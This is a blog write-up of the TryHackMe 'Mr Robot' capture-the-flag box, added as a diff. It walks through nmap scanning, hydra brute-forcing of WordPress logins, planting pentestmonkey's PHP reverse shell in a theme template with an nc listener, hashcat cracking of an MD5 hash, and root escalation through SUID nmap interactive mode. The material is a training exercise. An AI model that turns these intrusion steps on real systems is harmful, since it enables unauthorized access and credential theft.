@@ -1,0 +1,262 @@
+---
+layout: post
+title:  "Mr Robot CTF - TryHackMe"
+author: "dnstun0 (Jim Keeler)"
+date:   2021-01-19 22:45:00 -0500
+categories: tryhackme writeup
+---
+![Mr Robot Banner](/assets/img/20220114133259.png)
+
+[Mr Robot CTF](https://tryhackme.com/room/mrrobot) has been the most frustrating I've encountered so far; and not for reasons of difficulty. There are two brute force tasks that must be completed to obtain credentials, and the [TryHackMe](https://tryhackme.com/) throttling I experienced makes this unbearably slow. If you're going to attempt this box, I'd recommend watching the walkthrough and grabbing the credentials from there or just skipping this box entirely.
+
+> 🔔 Please note: To comply with TryHackMe’s write-up requirements, I’ve included a link to TryHackMe above and redacted all passwords, cracked hashes, and flags.
+
+## Initial Enumeration
+As always, we'll start with an nmap scan to find a quick starting point.
+
+```console
+$ sudo nmap -T4 -A mrrobot
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-31 21:09 EST
+Nmap scan report for mrrobot
+Host is up (0.11s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache
+443/tcp open   ssl/http Apache httpd
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+Device type: general purpose|specialized|storage-misc|WAP|printer
+Running (JUST GUESSING): Linux 3.X|4.X|5.X|2.6.X (91%), Crestron 2-Series (89%), HP embedded (89%), Asus embedded (88%)
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4
+Aggressive OS guesses: Linux 3.10 - 3.13 (91%), Linux 3.10 - 4.11 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.2 - 3.8 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Linux 5.4 (90%), Crestron XPanel control system (89%), Linux 3.12 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 58.58 seconds
+
+```
+
+Web services are always an easy place to start. If we view it in the browser, there's an interesting series of animations that happen before presenting an in-browser terminal.
+
+![](/assets/img/2021-12-31 21-16.gif)
+
+Each command plays a video or displays some fsociety posts. If we examine the responses in Burp, there are a couple of 404 responses that have actual page content. Apparently this is all running on top of a Wordpress instance.
+
+Let's use [wpscan](https://github.com/wpscanteam/wpscan) to probe for vulnerabilities. I'll spare you the output listing because there's not much useful in the results. The scan finds a _robots.txt_ file and discovers XML-RPC is enabled. I also ran a user enumeration scan, but since there aren't any posts it can't find any users.
+
+### First Key
+Starting with _robots.txt_, we discover it leaks the first key location!
+
+```text
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+```
+<div style="text-align: center; font-style: italic; font-size: 12px">http://mrrobot/robots.txt</div>
+
+```text
+REDACTED
+```
+<div style="text-align: center; font-style: italic; font-size: 12px">http://mrrobot/key-1-of-3.txt</div>
+
+The _fsocity.dic_ file seems to be a dictionary file which may be useful later. We'll download a copy for now. Next, we'll mess with the administrator login page a little.
+
+![](/assets/img/20220114094201.png)
+
+## Brute Forcing Wordpress Credentials
+That's interesting. The error message is telling us we used an invalid username. This means we can most likely brute force a valid one. [SecLists](https://github.com/danielmiessler/SecLists) has some great username lists we can try. We just need to feed the list to [hydra](https://github.com/vanhauser-thc/thc-hydra).
+
+```console
+$ hydra -v -L /usr/share/seclists/Usernames/Names/names.txt -p password -S mrrobot http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username."
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-14 09:53:31
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 10177 login tries (l:10177/p:1), ~637 tries per task
+[DATA] attacking http-post-forms://mrrobot:443/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username.
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[STATUS] 840.00 tries/min, 840 tries in 00:01h, 9337 to do in 00:12h, 16 active
+[STATUS] 599.00 tries/min, 1797 tries in 00:03h, 8380 to do in 00:14h, 16 active
+[STATUS] 313.14 tries/min, 2192 tries in 00:07h, 7985 to do in 00:26h, 16 active
+[443][http-post-form] host: mrrobot   login: elliot   password: password
+[ERROR] Received signal 2, going down ...
+The session file ./hydra.restore was written. Type "hydra -R" to resume session.
+```
+
+After about seven minutes, hydra receives a response without the "Invalid username." text and the username used was "elliot". Now we can try brute forcing elliot's password with the dictionary file we downloaded earlier.
+
+```console
+$ hydra -R -v -l elliot -P fsocity.dic -S mrrobot http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered for the username"
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+[INFORMATION] reading restore file ./hydra.restore
+[WARNING] options after -R are now honored (since v8.6)
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-14 11:56:14
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:1/p:858235), ~53640 tries per task
+[DATA] attacking http-post-forms://mrrobot:443/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered for the username
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[STATUS] 9674.00 tries/min, 9674 tries in 00:01h, 848561 to do in 01:28h, 16 active
+[STATUS] 3278.00 tries/min, 9834 tries in 00:03h, 848401 to do in 04:19h, 16 active
+[STATUS] 1456.57 tries/min, 10196 tries in 00:07h, 848039 to do in 09:43h, 16 active
+[STATUS] 726.13 tries/min, 10892 tries in 00:15h, 847343 to do in 19:27h, 16 active
+[STATUS] 396.39 tries/min, 12288 tries in 00:31h, 845947 to do in 35:35h, 16 active
+[STATUS] 292.02 tries/min, 13725 tries in 00:47h, 844510 to do in 48:12h, 16 active
+[STATUS] 240.59 tries/min, 15157 tries in 01:03h, 843078 to do in 58:25h, 16 active
+```
+
+You may notice the output listing above is incomplete. After three hours of getting throttled, restarting the box, and resuming my hydra session, I gave up and just grabbed the correct password from the walkthrough video.
+
+## Opening a Reverse Shell
+Once logged into the admin dashboard, we can modify the current theme's PHP code to be a reverse shell. You just need to navigate to Appearance > Editor and then select the 404 template.
+
+![](/assets/img/20220114130621.png)
+
+I like pentestmonkey's [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell). Just modify the destination IP address and port, copy, paste, and save. Make sure you have a listener running and then hit a page that doesn't exist, or the 404 page directly. (e.g. http://mrrobot/404.php)
+
+If everything worked, you should now have a shiny new daemon shell!
+
+```console
+$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.0.0.1] from (UNKNOWN) [mrrobot] 40535
+Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+ 18:11:52 up  1:20,  0 users,  load average: 0.00, 0.85, 3.03
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+daemon
+$ 
+```
+
+## Cracking robot's Password
+I like to check the home directory first. Sure enough, there's a directory for the "robot" user; and it has the second key! Unfortunatley it's only readable by that user, but there appears to be an MD5 hash of password.
+
+```console
+$ cd /home/robot
+$ ls
+key-2-of-3.txt
+password.raw-md5
+$ ls -al
+total 16
+drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
+drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
+-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+$ cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+$ 
+```
+
+We can use hashcat to try and crack the hash.
+
+```console
+$ hashcat -m0 -a0 ./hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt                       
+hashcat (v6.1.1) starting...
+...
+
+c3fcd3d76192e4007dfb496cca67e13b:REDACTED
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: MD5
+Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
+...
+```
+
+## Becoming robot
+It doesn't take long. We can't SSH in since the port is closed, so we'll have to `su` a new shell as that user. We can't do that until we upgrade our shell, and I like to use Python.
+
+```console
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+daemon@linux:/home/robot$ su -lc /bin/bash robot
+su -lc /bin/bash robot
+Password: 
+
+bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+bash: no job control in this shell
+robot@linux:~$ 
+```
+
+### Second Key
+Now we can read the file.
+
+```console
+robot@linux:~$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+REDACTED
+robot@linux:~$ 
+```
+
+## Privilege Escalation
+On to privilege escalation. Let's search for SUID bit files.
+
+```console
+robot@linux:~$ find / -perm /4000 2>/dev/null
+find / -perm /4000 2>/dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+robot@linux:~$ 
+```
+
+[gtfobins](https://gtfobins.github.io/gtfobins/nmap/) says we can get a shell by running nmap in interactive mode and then dropping into a shell. Let's try it.
+
+```console
+robot@linux:~$ nmap --interactive
+nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+!sh
+sh: 0: can't access tty; job control turned off
+# whoami
+whoami
+root
+# 
+```
+
+### Third Key
+It works! Last thing to do is get that third key sitting in the _/root_ directory.
+
+```console
+# cd /root
+cd /root
+# ls -al
+ls -al
+total 32
+drwx------  3 root root 4096 Nov 13  2015 .
+drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
+-rw-------  1 root root 4058 Nov 14  2015 .bash_history
+-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
+drwx------  2 root root 4096 Nov 13  2015 .cache
+-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
+-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
+-rw-r--r--  1 root root  140 Feb 20  2014 .profile
+-rw-------  1 root root 1024 Sep 16  2015 .rnd
+# cat key-3-of-3.txt
+cat key-3-of-3.txt
+REDACTED
+# 
+```
